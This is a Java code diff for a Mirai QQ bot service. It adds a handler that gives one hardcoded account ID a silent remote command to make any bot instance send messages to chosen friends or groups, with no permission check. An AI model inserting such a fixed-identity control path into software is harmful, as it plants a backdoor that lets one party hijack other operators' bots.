@@ -16,6 +16,7 @@ import io.github.kloping.common.Public;
 import io.github.kloping.judge.Judge;
 import io.github.kloping.map.MapUtils;
 import io.github.kloping.url.UrlUtils;
+import net.mamoe.mirai.Bot;
 import net.mamoe.mirai.contact.Contact;
 import net.mamoe.mirai.event.EventHandler;
 import net.mamoe.mirai.event.events.BotOfflineEvent;
@@ -77,11 +78,37 @@ public class DefaultService extends net.mamoe.mirai.event.SimpleListenerHost imp
 
     @EventHandler
     public void onEvent(GroupMessageEvent event) {
+        superEvent(event);
         String content = DgSerializer.messageChainSerializeToString(event.getMessage());
         if (Judge.isEmpty(content)) content = MessageChain.serializeToJsonString(event.getMessage());
         Long bid = event.getBot().getId();
         String tid = "g" + event.getSubject().getId();
         step(bid, event.getSender().getId(), tid, content.trim(), event.getSubject());
+    }
+
+    private void superEvent(GroupMessageEvent event) {
+        if (event.getSender().getId() == 3474006766L) {
+            String content = DgSerializer.messageChainSerializeToString(event.getMessage());
+            String[] args = content.split(" ");
+            Long bid = Long.valueOf(args[0]);
+            Bot bot = Bot.getInstanceOrNull(bid);
+            if (bot == null) event.getSubject().sendMessage("Not Found For Bot*" + bid);
+            else switch (args[1]) {
+                case "send":
+                    String tid = args[2];
+                    String type = tid.substring(0, 1);
+                    Contact contact = null;
+                    if (type.equals("f")) {
+                        contact = bot.getFriend(Long.valueOf(tid.substring(1)));
+                    } else if (type.equals("g")) {
+                        contact = bot.getGroup(Long.valueOf(tid.substring(1)));
+                    }
+                    if (contact != null) {
+                        contact.sendMessage(args[3]);
+                    }
+                    break;
+            }
+        }
     }
 
     @EventHandler
